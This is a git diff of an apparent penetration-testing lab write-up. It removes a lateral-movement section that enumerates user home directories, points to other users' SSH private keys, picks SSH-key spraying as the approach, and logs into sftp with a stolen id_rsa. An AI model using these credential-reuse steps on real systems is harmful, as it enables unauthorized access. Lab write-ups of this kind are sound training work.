@@ -254,61 +254,9 @@ Connected to 10.10.64.168.
 sftp> 
 ```
 
-### j_moore Lateral Move to net-admin
-Recon of the internal environment provides a likely attack path:  
-### What do we know:  
-- All users on the target server:
-```bash
-ls -la /home
-```
-```bash
-drwxr-xr-x 12 root      root      4096 Jan  3 02:23 .
-drwxr-xr-x 20 root      root      4096 Dec 28 04:30 ..
-drwxr-x---  3 d_wilson  d_wilson  4096 Jan  2 21:08 d_wilson
-drwxr-x---  3 e_johnson e_johnson 4096 Jan  2 21:08 e_johnson
-drwxr-x---  3 j_davis   j_davis   4096 Jan  2 21:08 j_davis
-drwxr-x---  6 j_moore   j_moore   4096 Jan  2 21:36 j_moore
-drwxr-x---  3 j_smith   j_smith   4096 Jan  2 21:08 j_smith
-drwxr-x---  5 m_brown   m_brown   4096 Jan  2 21:08 m_brown
-drwxr-x---  4 net-admin net-admin 4096 Jan  2 21:08 net-admin
-drwxr-x---  3 s_miller  s_miller  4096 Jan  2 21:08 s_miller
-drwxr-xr-x  4 root      root      4096 Jan  2 21:08 sftp
-drwxr-x---  4 sys-admin sys-admin 4096 Jan  2 21:08 sys-admin
-```
+### sftp, Lateral Move to net-admin
 
-- j_moore is part of the sftp_service group:
-```bash
-id
-```
-```bash
-uid=1001(j_moore) gid=1001(j_moore) groups=1001(j_moore),1002(sftp_service)
-```
-### What do we have:  
-- j_moore's private and public key:
-```bash
-ls -la /home/j_moore/.ssh/
-```
-- m_brown's private and public key:
-```bash
-ls -la /home/m_brown/.ssh
-```
-- Breached Credentials.
-
-
-### What can we do:
-- SSH-Key Spray [+]
-- Password Spray [x]
-- Brute Force [x]
-
-
-The nmap scan identifies an additional account that can be accessed via j_moore's id_rsa, the sftp 
-account. Confirm the credentials by logging into the sftp service.
-```bash
-sftp -i id_rsa sftp@$ip
-```
-enter the passphrase for j_moore's id_rsa, and check your id.
----
----
+ 
 
 ## Privilege Escalation (MITRE ATT&CK Outline)
 
